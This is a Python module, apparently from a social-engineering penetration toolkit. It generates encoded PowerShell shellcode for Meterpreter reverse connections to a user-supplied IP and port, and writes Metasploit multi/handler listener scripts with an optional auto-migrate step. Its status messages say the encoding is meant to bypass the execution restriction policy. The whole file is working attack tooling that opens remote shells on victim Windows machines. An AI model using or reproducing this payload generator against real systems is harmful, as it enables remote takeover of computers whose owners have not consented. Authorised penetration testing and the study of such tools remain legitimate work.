import sys
import subprocess
import re
import os
import time
from src.core.setcore import *
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off":
    stage_encoding = "false"
else:
    stage_encoding = "true"
powershell_solo = check_options("POWERSHELL_SOLO")
port = check_options("PORT=")
auto_migrate = check_config("AUTO_MIGRATE=")
pyinjection = check_options("PYINJECTION=")
if pyinjection == "ON":
    if os.path.isfile(userconfigpath + "payload_options.shellcode"):
        pyinjection = "on"
        print_status(
            "Multi/Pyinjection was specified. Overriding config options.")
    else:
        pyinjection = "off"
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input("Enter the ipaddress for the reverse connection: ")
    update_options("IPADDR=" + ipaddr)
multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()
if pyinjection == "on":
    multi_injection = "off"
powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
if validate_ip(ipaddr) == False:
    powershell_inject_x86 = "windows/meterpreter/reverse_https"
if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
    if multi_injection != "on":
        if pyinjection == "off":
            print_status(
                "POWERSHELL_INJECTION is set to ON with multi-pyinjector")
            port = input(setprompt(
                ["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
            if port == "":
                port = "443"
            fileopen = open("%s/meta_config_multipyinjector" % (userconfigpath), "r")
            data = fileopen.read()
            match = re.search(port, data)
            if not match:
                filewrite = open(
                    "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                filewrite.write("\nuse exploit/multi/handler\n")
                if auto_migrate == "ON":
                    filewrite.write(
                        "set AutoRunScript post/windows/manage/smart_migrate\n")
                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit -j\n" %
                                (powershell_inject_x86, ipaddr, port, stage_encoding))
                filewrite.close()
if multi_injection != "on":
    if pyinjection == "off":
        if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
            if check_options("PORT=") != 0:
                port = check_options("PORT=")
            else:
                port = input(setprompt(
                    ["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
                if port == "":
                    port = "443"
                update_options("PORT=" + port)
if powershell_solo == "ON":
    multi_injection = "off"
    pyinjection = "on"
if multi_injection == "on":
    if pyinjection == "off":
        print_status(
            "Multi-Powershell-Injection is set to ON, this should be sweet...")
x86 = ""
multi_injection_x86 = ""
if multi_injection == "on":
    port = check_config("POWERSHELL_MULTI_PORTS=")
    port = port.split(",")
if multi_injection == "on":
    for ports in port:
        if ports != "":
            print_status(
                "Generating x86-based powershell injection code for port: %s" % (ports))
            multi_injection_x86 = multi_injection_x86 + "," + \
                generate_powershell_alphanumeric_payload(
                    powershell_inject_x86, ipaddr, ports, x86)
            if os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                port_check = check_ports(
                    "%s/meta_config_multipyinjector" % (userconfigpath), ports)
                if port_check == False:
                    filewrite = open(
                        "%s/meta_config_multipyinjector" % (userconfigpath), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write(
                            "set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (
                        powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()
            if not os.path.isfile("%s/meta_config_multipyinjector" % (userconfigpath)):
                if not os.path.isfile("%s/meta_config" % (userconfigpath)):
                    filewrite = open("%s/meta_config" % (userconfigpath), "w")
                    filewrite.write("")
                    filewrite.close()
                port_check = check_ports("%s/meta_config" % (userconfigpath), ports)
                if port_check == False:
                    filewrite = open("%s/meta_config" % (userconfigpath), "a")
                    filewrite.write("\nuse exploit/multi/handler\n")
                    if auto_migrate == "ON":
                        filewrite.write(
                            "set AutoRunScript post/windows/manage/smart_migrate\n")
                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (
                        powershell_inject_x86, ipaddr, stage_encoding, ports))
                    filewrite.close()
if pyinjection == "on":
    multi_injection_x86 = ""
    fileopen = open(userconfigpath + "payload_options.shellcode", "r")
    payloads = fileopen.read()[:-1].rstrip()  # strips an extra ,
    payloads = payloads.split(",")
    for payload in payloads:
        payload = payload.split(" ")
        powershell_inject_x86 = payload[0]
        port = payload[1]
        print_status("Generating x86-based powershell injection code...")
        multi_injection_x86 = multi_injection_x86 + "," + \
            generate_powershell_alphanumeric_payload(
                powershell_inject_x86, ipaddr, port, x86)
if multi_injection == "off":
    if pyinjection == "off":
        print_status("Generating x86-based powershell injection code...")
        x86 = generate_powershell_alphanumeric_payload(
            powershell_inject_x86, ipaddr, port, x86)
if multi_injection == "on" or pyinjection == "on":
    x86 = multi_injection_x86[1:]  # remove comma at beginning
verbose = check_config("POWERSHELL_VERBOSE=")
if verbose.lower() == "on":
    print_status("Printing the x86 based encoded code...")
    time.sleep(3)
    print(x86)
filewrite = open("%s/x86.powershell" % (userconfigpath), "w")
filewrite.write(x86)
filewrite.close()
print_status("Finished generating powershell injection bypass.")
print_status("Encoded to bypass execution restriction policy...")